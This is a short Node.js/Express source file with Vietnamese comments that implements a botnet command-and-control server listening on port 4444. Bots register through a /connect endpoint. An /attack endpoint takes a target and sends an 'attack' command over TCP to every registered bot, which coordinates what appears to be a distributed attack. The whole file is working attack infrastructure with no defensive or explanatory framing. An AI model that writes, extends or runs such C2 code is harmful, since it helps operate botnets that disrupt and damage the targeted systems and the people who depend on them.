const express = require('express');
const net = require('net');
const app = express();
const port = 4444;

app.use(express.json()); // Để xử lý JSON request

// Lưu trữ các kết nối của bot
let botConnections = [];

// Khi bot kết nối
app.post('/connect', (req, res) => {
  const bot = req.body;
  botConnections.push(bot);
  console.log(`New bot connected: ${bot.id}`);
  res.send('Bot connected');
});

// Lệnh tấn công
app.post('/attack', (req, res) => {
  const { target } = req.body;
  
  console.log(`Initiating attack on: ${target}`);
  
  // Gửi lệnh tấn công đến tất cả các bot
  botConnections.forEach((bot) => {
    console.log(`Sending attack command to bot ${bot.id} targeting ${target}`);
    
    // Tạo kết nối TCP tới bot và gửi lệnh tấn công
    const client = net.createConnection({ host: bot.host, port: bot.port }, () => {
      client.write(`attack ${target}\n`);
    });

    client.on('error', (err) => {
      console.error(`Error connecting to bot ${bot.id}:`, err);
    });

    client.on('end', () => {
      console.log(`Command sent to bot ${bot.id}`);
    });
  });

  res.send(`Attack initiated on ${target}`);
});

app.listen(port, () => {
  console.log(`C2 Server listening at http://localhost:${port}`);
});
